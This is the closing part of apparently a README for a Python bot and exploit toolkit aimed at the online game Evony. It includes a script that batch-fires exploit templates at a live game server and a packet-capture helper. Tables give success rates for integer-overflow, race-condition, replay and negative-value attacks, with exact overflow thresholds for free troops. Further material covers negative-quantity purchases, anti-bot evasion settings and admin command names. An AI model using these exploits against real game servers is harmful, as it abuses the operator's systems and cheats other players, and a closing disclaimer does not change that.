    """Get discovered IDs"""
    response = requests.get(f"{BASE_URL}/api/discovered")
    return response.json()

def run_template(template_id, overrides):
    """Run a single template"""
    response = requests.post(f"{BASE_URL}/api/send_template", json={
        "template": template_id,
        "overrides": overrides
    })
    return response.json()

def batch_test():
    """Test all exploit templates"""
    templates = get_templates()
    discovered = get_discovered()
    
    castle_id = discovered.get("castleIds", [0])[0]
    hero_id = discovered.get("heroIds", [0])[0]
    
    print(f"Testing with Castle: {castle_id}, Hero: {hero_id}")
    print("-" * 60)
    
    results = {"success": 0, "failed": 0, "blocked": 0}
    
    for tid, template in templates.items():
        print(f"\nTesting: {tid}")
        print(f"  Command: {template.get('cmd')}")
        
        result = run_template(tid, {
            "castleId": castle_id,
            "heroId": hero_id
        })
        
        if result.get("ok") == 1:
            print(f"  Result: SUCCESS")
            results["success"] += 1
        elif result.get("ok") == -99:
            print(f"  Result: BLOCKED (server-side)")
            results["blocked"] += 1
        else:
            print(f"  Result: FAILED - {result}")
            results["failed"] += 1
        
        time.sleep(0.5)  # Rate limiting
    
    print("\n" + "="*60)
    print("BATCH TEST RESULTS")
    print("="*60)
    print(f"Success: {results['success']}")
    print(f"Failed:  {results['failed']}")
    print(f"Blocked: {results['blocked']}")

if __name__ == "__main__":
    batch_test()
```

### Packet Capture and Analysis

```python
#!/usr/bin/env python3
"""
Packet capture analysis - decode captured AMF3 packets
"""

from server import amf3_decode
import binascii

def analyze_packet(hex_data):
    """Analyze a captured packet"""
    try:
        # Remove length prefix (first 4 bytes)
        data = bytes.fromhex(hex_data)
        length = int.from_bytes(data[:4], 'big')
        payload = data[4:]
        
        print(f"Packet length: {length}")
        print(f"Payload size:  {len(payload)}")
        
        decoded = amf3_decode(payload)
        print(f"Command: {decoded.get('cmd')}")
        print(f"Data: {decoded.get('data')}")
        
        return decoded
    except Exception as e:
        print(f"Decode error: {e}")
        return None

def capture_session(output_file="capture.log"):
    """Capture packets from bot server logs"""
    import requests
    
    logs = requests.get("http://localhost:9999/api/logs").json()
    
    with open(output_file, 'w') as f:
        for log in logs:
            f.write(f"[{log['time']}] {log['type'].upper()}\n")
            f.write(f"  CMD: {log.get('cmd', 'N/A')}\n")
            f.write(f"  DATA: {log.get('data', {})}\n\n")
    
    print(f"Captured {len(logs)} packets to {output_file}")

# Example captured packets
EXAMPLE_PACKETS = [
    # Login packet
    "0000002a0a0b01076c6f67696e0904010875736572...",
    # troop.produceTroop
    "0000003f0a0b0114747261636b2e70726f6475636554726f6f70...",
]

if __name__ == "__main__":
    capture_session()
```

---

## Performance Benchmarks

### Exploit Timing Analysis

| Exploit Type | Avg Response Time | Success Rate | Notes |
|--------------|-------------------|--------------|-------|
| **Integer Overflow** | 150ms | 85% | Depends on server load |
| **Race Condition** | 50ms* | 40-60% | *per thread |
| **Packet Replay** | 100ms | 70% | Diminishing returns |
| **Parameter Tampering** | 120ms | 30% | Most heavily validated |
| **Negative Values** | 110ms | 25% | Server-side checks |

### Connection Benchmarks

| Metric | Value | Notes |
|--------|-------|-------|
| **Connect Time** | 500-2000ms | Depends on server location |
| **Login Time** | 200-500ms | After connection established |
| **Keepalive Interval** | 300s (5 min) | Configurable |
| **Max Retry** | 3 attempts | 2s delay between |
| **Packet Queue Rate** | 10/sec max | Anti-bot throttling |

### Memory Usage

| Component | Memory | Notes |
|-----------|--------|-------|
| **HTTP Server** | ~20MB | Base overhead |
| **EvonyClient** | ~5MB | Per connection |
| **Packet Log** | ~1MB/1000 packets | Cleared on /api/clear_logs |
| **AMF3 Codec** | ~1MB | Shared instances |

---

## Configuration Options

### Environment Variables

```bash
# Server configuration
export EVONY_BOT_PORT=9999
export EVONY_BOT_HOST=0.0.0.0

# Connection settings
export EVONY_CONNECT_TIMEOUT=10
export EVONY_LOGIN_TIMEOUT=5
export EVONY_RETRY_COUNT=3
export EVONY_RETRY_DELAY=2

# Anti-bot settings
export EVONY_SEND_DELAY=0.1
export EVONY_KEEPALIVE_INTERVAL=300

# Logging
export EVONY_LOG_LEVEL=INFO
export EVONY_LOG_FILE=evony_bot.log
```

### Configuration File (config.json)

```json
{
  "server": {
    "host": "0.0.0.0",
    "port": 9999
  },
  "connection": {
    "timeout": 10,
    "login_timeout": 5,
    "retry_count": 3,
    "retry_delay": 2
  },
  "anti_bot": {
    "send_delay": 0.1,
    "keepalive_interval": 300,
    "slot_delay": 25
  },
  "logging": {
    "level": "INFO",
    "file": "evony_bot.log",
    "max_packets": 10000
  },
  "exploits": {
    "enabled_categories": ["troop", "shop", "hero", "army"],
    "disabled_templates": ["gm_set_resources_max"]
  }
}
```

---

## Appendix A: AMF3 Type Reference

### Complete Type System

| Marker | Name | Size | Description |
|--------|------|------|-------------|
| 0x00 | undefined | 1 byte | Undefined value |
| 0x01 | null | 1 byte | Null value |
| 0x02 | false | 1 byte | Boolean false |
| 0x03 | true | 1 byte | Boolean true |
| 0x04 | integer | 1-5 bytes | U29 integer (29-bit) |
| 0x05 | double | 9 bytes | 64-bit IEEE float |
| 0x06 | string | variable | U29 length + UTF-8 |
| 0x07 | xml-doc | variable | Legacy XML document |
| 0x08 | date | 9 bytes | U29 + double (ms since epoch) |
| 0x09 | array | variable | U29 length + items |
| 0x0A | object | variable | U29 traits + properties |
| 0x0B | xml | variable | E4X XML |
| 0x0C | bytearray | variable | U29 length + bytes |
| 0x0D | vector-int | variable | Vector of int |
| 0x0E | vector-uint | variable | Vector of uint |
| 0x0F | vector-double | variable | Vector of double |
| 0x10 | vector-object | variable | Vector of objects |
| 0x11 | dictionary | variable | Dictionary (weak keys) |

### String Reference Table

AMF3 maintains a reference table to avoid repeating strings:

```
First occurrence:
  Write: 0x06 (string marker)
  Write: (len << 1) | 1 (U29, odd = inline)
  Write: UTF-8 bytes

Subsequent:
  Write: 0x06 (string marker)
  Write: ref << 1 (U29, even = reference)
```

### Object Traits

```
Traits encoding (U29):
  bit 0: 0 = traits ref, 1 = inline
  bit 1: 0 = not externalizable
  bit 2: 0 = not dynamic
  bits 3+: property count (if inline)

Example inline traits:
  0x0B = 0b1011 = inline, not extern, dynamic, 1 prop
```

---

## Appendix B: Complete Exploit Template List

### Discovery Templates (15)

| ID | Command | Description |
|----|---------|-------------|
| `get_player_info` | `common.getPlayerInfoByName` | Lookup player by name |
| `get_zone_info` | `common.zoneInfo` | Get server zone info |
| `get_hero_list` | `hero.getHerosListFromTavern` | List available heroes |
| `get_flee_hero` | `hero.getFleeHeroList` | List fled heroes |
| `get_troop_queue` | `troop.getProduceQueue` | Get training queue |
| `get_buildings_in` | `castle.getAvailableBuildingListInside` | Inner buildings |
| `get_buildings_out` | `castle.getAvailableBuildingListOutside` | Outer buildings |
| `get_map_info` | `common.mapInfo` | Get map tile data |
| `get_quest_list` | `quest.getQuestList` | List quests |
| `get_troop_param` | `army.getTroopParam` | Troop parameters |
| `get_injured` | `army.getInjuredTroop` | Injured troops |
| `get_flee_troop` | `army.getFleeTroop` | Fled troops |
| `get_alliance_army` | `army.getStayAllianceArmys` | Allied armies |
| `get_resources` | `castle.UpdateCastleResources` | Refresh resources |
| `get_packages` | `common.getPackageList` | Gift packages |

### Troop Overflow Templates (6)

| ID | Troop | Threshold | Effect |
|----|-------|-----------|--------|
| `archer_overflow` | Archer (6) | 6,135,037 | 6.1M free archers |
| `worker_overflow` | Worker (1) | 42,949,673 | 42.9M free workers |
| `catapult_overflow` | Catapult (12) | 715,828 | 715K free catapults |
| `cavalry_overflow` | Cavalry (7) | 4,294,968 | 4.3M free cavalry |
| `swordsman_overflow` | Swordsman (5) | 10,737,419 | 10.7M free swordsmen |
| `warrior_overflow` | Warrior (2) | 21,474,837 | 21.5M free warriors |

### Shop/Item Templates (20)

| ID | Command | Effect |
|----|---------|--------|
| `shop_buy_negative` | `shop.buy` | Buy negative quantity |
| `use_speed_15min` | `shop.useGoods` | 15 min speed up |
| `use_speed_1hr` | `shop.useGoods` | 1 hour speed up |
| `use_speed_8hr` | `shop.useGoods` | 8 hour speed up |
| `use_speed_24hr` | `shop.useGoods` | 24 hour speed up |
| `use_angel_atk` | `shop.useAngelItem` | Attack buff |
| `use_angel_def` | `shop.useAngelItem` | Defense buff |
| `use_devil_atk` | `shop.useDevilItem` | Enemy attack debuff |
| `use_devil_def` | `shop.useDevilItem` | Enemy defense debuff |
| `use_resource_boost` | `shop.useGoods` | Resource production boost |
| `use_exp_boost` | `shop.useGoods` | XP boost |
| `use_gambling_box` | `shop.useGoods` | Gambling reward box |
| `use_hero_item` | `shop.useGoods` | Hero enhancement |
| `use_trick_item` | `shop.useTrickItem` | Trick item effect |
| `use_negative_qty` | `shop.useGoods` | Negative quantity |
| `buy_gold_negative` | `shop.buyResource` | Negative gold |
| `buy_food_negative` | `shop.buyResource` | Negative food |
| `buy_wood_negative` | `shop.buyResource` | Negative wood |
| `buy_stone_negative` | `shop.buyResource` | Negative stone |
| `buy_iron_negative` | `shop.buyResource` | Negative iron |

---

## Appendix C: Evony Protocol Commands

### Full Command Namespace Reference

```
gameClient.*
  version          - Client version handshake
  ping             - Keepalive ping
  requestEncrypt   - Request encryption key
  
login              - Player authentication (no namespace)

server.*
  LoginResponse    - Login result
  CastleUpdate     - Castle data update
  HeroUpdate       - Hero data update
  ArmyUpdate       - Army data update
  
troop.*
  produceTroop     - Train troops
  disbandTroop     - Disband troops
  getProduceQueue  - Get training queue
  cancelProduce    - Cancel training
  speedUpProduce   - Speed up training
  
army.*
  newArmy          - Create new army
  disbandArmy      - Disband army
  callBackArmy     - Recall army
  getStayAllianceArmys  - Allied armies
  getInjuredTroop  - Injured troops
  getFleeTroop     - Fled troops
  getTroopParam    - Troop parameters
  
hero.*
  getHerosListFromTavern  - Tavern heroes
  getFleeHeroList  - Fled heroes
  hireHero         - Hire hero
  fireHero         - Fire hero
  addPoint         - Add stat points
  levelUp          - Level up hero
  resetPoint       - Reset stat points
  
castle.*
  getAvailableBuildingListInside   - Inner buildings
  getAvailableBuildingListOutside  - Outer buildings
  UpdateCastleResources            - Refresh resources
  moveCastle       - Move castle
  
shop.*
  buy              - Buy item
  useGoods         - Use item
  useTrickItem     - Use trick item
  useAngelItem     - Use angel buff
  useDevilItem     - Use devil debuff
  buyResource      - Buy resources
  
quest.*
  getQuestList     - List quests
  getAwardItems    - Claim rewards
  giveupQuest      - Abandon quest
  finishQuest      - Complete quest
  
trade.*
  newTrade         - Create trade listing
  cancelTrade      - Cancel trade
  searchTrade      - Search marketplace
  
common.*
  mapInfo          - Get map tiles
  zoneInfo         - Zone information
  getPlayerInfoByName  - Player lookup
  getPackageList   - Gift packages
  
gamemaster.*       - Admin commands (usually blocked)
  setResources     - Set resources
  addItems         - Add items
  setTechnology    - Set tech level
  setBuff          - Apply buff
```

---

## Related Documentation

- [WORKING_EXPLOITS_GUIDE.md](WORKING_EXPLOITS_GUIDE.md) - Detailed exploit guide
- [EXPLOIT_FINDINGS_FINAL.md](EXPLOIT_FINDINGS_FINAL.md) - Research findings
- [EXPLOIT_TEST_RESULTS.md](EXPLOIT_TEST_RESULTS.md) - Test results
- [EVONY_MCP_TOOLKIT_DESIGN.md](EVONY_MCP_TOOLKIT_DESIGN.md) - Architecture design
- [../evony_rte/README.md](../evony_rte/README.md) - MCP Server documentation
- [../Docs/INTEGRATION_GUIDE.md](../Docs/INTEGRATION_GUIDE.md) - Integration guide

---

## Changelog

### v2.0.0 (Current)
- Pure Python AMF3 implementation (no PyAMF dependency)
- 100+ exploit templates
- Auto-discovery system
- Anti-bot bypass techniques
- Web UI dashboard
- MCP integration

### v1.0.0
- Initial release
- Basic AMF3 support via PyAMF
- Simple exploit templates
- Command-line interface

---

## License

MIT License - See LICENSE file for details.

---

## Warning

**For educational/research purposes only. Use responsibly.**

This tool is designed for security research and should only be used:
- On accounts you own
- On private servers you control
- With explicit written permission

Unauthorized access to computer systems is illegal.
